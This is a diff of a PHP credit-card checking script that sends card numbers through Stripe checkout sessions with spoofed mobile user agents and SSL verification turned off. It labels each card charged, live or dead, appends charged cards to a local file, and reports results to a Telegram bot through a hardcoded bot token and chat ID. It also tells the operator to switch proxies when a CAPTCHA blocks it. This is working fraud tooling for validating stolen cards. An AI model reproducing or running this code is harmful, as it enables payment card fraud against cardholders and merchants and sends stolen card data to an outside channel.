+$headers[] = 'User-agent: Mozilla/5.0 (Linux; Android 11; M'.rand(11,99).'G) AppleWebKit/'.rand(11,99).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.0.0 Mobile Safari/'.rand(11,99).'.'.rand(11,99).'';
+$headers[] = 'sec-ch-ua-platform: "Android"';
+curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
+curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
+curl_setopt($ch, CURLOPT_COOKIESESSION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+$final = curl_exec($ch);
+$dcode2 = json_decode($final)->last_payment_error->decline_code;
+$msg = json_decode($final)->last_payment_error->message;
+$status = g($final, '"status": "','"');
+$dcode = g($final, '"decline_code": "','"');
 curl_close($ch);
-
-$result2;
-$dcode2 = json_decode($result2)->last_payment_error->decline_code;
-$currency = json_decode($result2)->currency;
-
-// DELETE COOKIES
-if (is_file($gon) && is_writable($gon)) {
-    unlink($gon);
-}
-
-// WELL IF MARAMING TXT FILE SA COOKIES FOLDER, WOOSHOO THEM!!
-$cookieFiles = glob(getcwd() . DIRECTORY_SEPARATOR . "cookies" . DIRECTORY_SEPARATOR . "jungkookie*.txt");
-foreach ($cookieFiles as $cookieFile) {
-    unlink($cookieFile);
-}
+sleep(5);
 
 //* Start of getting BIN Information *//
 
@@ -403,18 +388,18 @@ if (preg_match('/^4[0-9]{12}(?:[0-9]{3})?$/', $cc)) {
     $scheme = '';
 }
 
-$xamount = intval($xamount)/100;
-
 #############SET DESTINATION OF YOUR TG BOT
+$domain = $_SERVER['HTTP_HOST']; // give you the full URL of the current page that's being accessed
 $botToken = urlencode('5921984241:AAEB15S8Yv3jDyII6IqaRFuun1iSooBb5Qw');
 $chatID = urlencode('-1001815647781');
+$amttt = intval($amttt)/100;
 
 #############SEND TO TG BOT WHEN CHARGED
-$charged_message = "Successfull Checkout\r\n\nBIN:\r\n$lista\r\nSuccess URL:\r\n".urldecode($success)."\r\nAmount: ".strtoupper($currency)." $xamount\r\n\nChecked from:\r\n$domain";
+$charged_message = "Successful Checkout\r\n\nBIN:\r\n$card\r\nSuccess URL:\r\n".urldecode($success)."\r\nAmount: $amttt\r\n\nChecked from:\r\n$domain";
 $sendcharged = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($charged_message).'';
 
 #############SEND TO TG BOT WHEN INSUFFBAL
-$insuf_message = "Insufficient Funds\r\n\nBIN: $lista\r\nAmount to bill: ".strtoupper($currency)." $xamount\r\nStripe Checkout link:\r\n".urldecode($colink)."\r\n\nChecked from:\r\n$domain";
+$insuf_message = "Insufficient Funds\r\n\nBIN: $card\r\nAmount to bill: $amttt\r\nStripe Checkout link:\r\n".urldecode($colink)."\r\n\nChecked from:\r\n$domain";
 $sendinsuff = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatID.'&text='.urlencode($insuf_message).'';
     
 #############BOT RETRY TO SEND IF ITS NOT WORKS
@@ -423,140 +408,63 @@ $num_retries = 0;
 $sendchargedtotg = false;
 $sendinsufftotg = false;
 
-
-#############SUCCEEDED SUCCESS
- if (strpos($result1, '"status": "succeeded"')) {
+/////////===================/////////////////
+if (strpos($final, '"status": "succeeded"')) {
     while (!$sendchargedtotg && $num_retries < $max_retries) {
     $sendchargedtotg = @file_get_contents($sendcharged);
     $num_retries++;
-    echo "<span class='badge badge-success'>#CHARGED</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: green;' class='badge'>The payment transaction has been successfully processed <a href='$success'  target='_blank'>[ proof here ]</a> -Alice Schuberg 💰✅</span><br>";
+    echo ''.$myip.'<span class="badge badge-success">#CHARGED</span> <font class="text-white">'.$cc.'|'.$mm.'|'.$yy.'</font>  '.$scheme.''.$cctype.''.$bank_name.''.$cc_country.'<font class="text-white"><br>➤ The payment transaction has been successfully processed 💰✅<br>Amount: '.$amttt.'<br>➤ Receipt: <span style="background-color: white; color: green;" class="badge"><a href="'.$success.'"  target="_blank"><b>'.$success.'</b></a></span><br>';
+    fwrite(fopen('auto-charged-ccs.txt', 'a'), $card."\r\n");
+    }
+exit;
 }
-    exit();
+elseif(strpos($final, '"insufficient_funds"')) {
+ echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
 }
-#############DECLINECODEcurl0
-elseif(strpos($curl0, 'card_not_supported')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>card_not_supported $status</span><br>";
-    exit();
+elseif(strpos($ppage2, '"insufficient_funds"')) {
+ echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
 }
-elseif(strpos($curl0, 'generic_decline')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline $status</span><br>";
-    exit();
+elseif(strpos($pm, '"insufficient_funds"')) {
+ echo "$myip<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
 }
-elseif(strpos($curl0, 'intent_confirmation_challenge')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>blocked by captcha | use proxy</span><br>";
-    exit();
+elseif(strpos($ppage2, '"type": "intent_confirmation_challenge"')){
+   
+    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Blocked by CAPTCHA (change your proxy)</span><br>";
 }
-elseif($tos == "required") {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Must agree to terms of service to complete your transaction.</span><br>";
-    sleep(1);
-    exit();
+elseif(strpos($ppage2, '"message": "Your payment has already been processed."')){
+    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Your stripe checkout link is expired</span><br>";
 }
-if (strpos($curl0, '"insufficient_funds"')) {
-    while (!$sendinsufftotg && $num_retries < $max_retries) {
-    $sendinsufftotg = @file_get_contents($sendinsuff);
-    $num_retries++;
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
+elseif($status == "requires_action"){
+    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site (Possible errors: [$dcode : $status])</span><br>";
 }
-    exit();
+elseif(strpos($ppage2, '"status": "requires_action"')){
+    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3DS Site (Possible errors: [$dcode : $status])</span><br>"; 
 }
-
-#############DECLINECODEcurl1
-elseif(strpos($curl1, 'fraudulent')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>fraudulent $status</span><br>";
-    exit();
+elseif(strpos($ppage2, '"decline_code": "generic_decline"')){
+    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline</span><br>"; 
+    
 }
-elseif(strpos($curl1, 'incorrect_number')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>incorrect_number $status</span><br>";
-    exit();
+elseif(strpos($pm, '"decline_code": "generic_decline"')){
+    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline</span><br>"; 
 }
-elseif(strpos($curl1, 'invalid_account')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>invalid_account $status</span><br>";
-    exit();
+elseif(strpos($ppage2, '"message": "An error has occurred confirming the Checkout Session."')){
+    echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'><b>Payment Failed - CHECK YOUR PK/CS/EMAIL</b></span><br>";
+    
+    
 }
-elseif(strpos($curl1, 'generic_decline')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline $status</span><br>";
-    exit();
+else {
+echo "$myip<span class='badge badge-danger'>DIE</span> <font class='text-white'>$card</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Payment Failed (Possible errors: [$code $decline_code $status $msg $dcode2 $message $dcode]</span><br>"; 
+    
+    
 }
-elseif(strpos($curl1, 'intent_confirmation_challenge')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>blocked by captcha | use proxy</span><br>";
-    exit();
+// DELETE COOKIES AT IBA PANG MGA LIBAG
+if (is_file($cookies) && is_writable($cookies)) {
+    unlink($cookies);
+    unset($ch);
+    flush();
+    ob_flush();
+    ob_end_flush();
 }
-elseif(strpos($curl1, '"status": "requires_action"')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>NEED OTP $status</span><br>";
-    exit();
-}
-elseif($tos == "required") {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Must agree to terms of service to complete your transaction.</span><br>";
-    exit();
-}
-if (strpos($curl1, '"insufficient_funds"')) {
-    while (!$sendinsufftotg && $num_retries < $max_retries) {
-    $sendinsufftotg = @file_get_contents($sendinsuff);
-    $num_retries++;
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
-}
-    exit();
-}
-
-#############DECLINECODEresult1
-elseif(strpos($result1, 'payment_intent_authentication_failure')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>The provided Payment Method has failed authentication. $status</span><br>";
-    exit();
-}
-elseif(strpos($result1, 'BEGIN CERTIFICATE')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>3D SECURED CARD $status</span><br>";
-    exit();
-}
-elseif(strpos($result1, 'fraudulent')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>fraudulent $status</span><br>";
-    exit();
-}
-elseif(strpos($result1, 'generic_decline')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>generic_decline $status</span><br>";
-    exit();
-}
-elseif(strpos($result1, 'intent_confirmation_challenge')) {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>blocked by captcha | use proxy</span><br>";
-    exit();
-}
-elseif($tos == "required") {
-    echo "<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Must agree to terms of service to complete your transaction.</span><br>";
-    exit();
-}
-if (strpos($result1, '"insufficient_funds"')) {
-    while (!$sendinsufftotg && $num_retries < $max_retries) {
-    $sendinsufftotg = @file_get_contents($sendinsuff);
-    $num_retries++;
-    echo "<span class='badge badge-warning'>#LIVE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>insufficient_funds $status 💸❌</span><br>";
-}
-    exit();
-}
-
-#############ELSEDECLINE
- else
-   {
-$d_code = "";
-if (!empty($dc2)) {
-  $d_code = $dc2;
-} else if (!empty($dcode1)) {
-  $d_code = $dcode1;
-} else if (!empty($dcode2)) {
-  $d_code = $dcode2;
-} else if (!empty($mes1)) {
-  $d_code = $mes1;
-} else if (!empty($mes2)) {
-  $d_code = $mes2;
-} else if (!empty($msg)) {
-  $d_code = $msg;
-}
-     echo"<span class='badge badge-danger'>DIE</span> <font class='text-white'>$lista</font> $scheme$cctype$bank_name$cc_country <span style='background-color: white; color: red;' class='badge'>Payment Failed $d_code</span><br>";
-     exit();
-   }
-
-unset($ch);
-unlink($cookies);
-flush();
-ob_flush();
-ob_end_flush();
 
 ?>
+
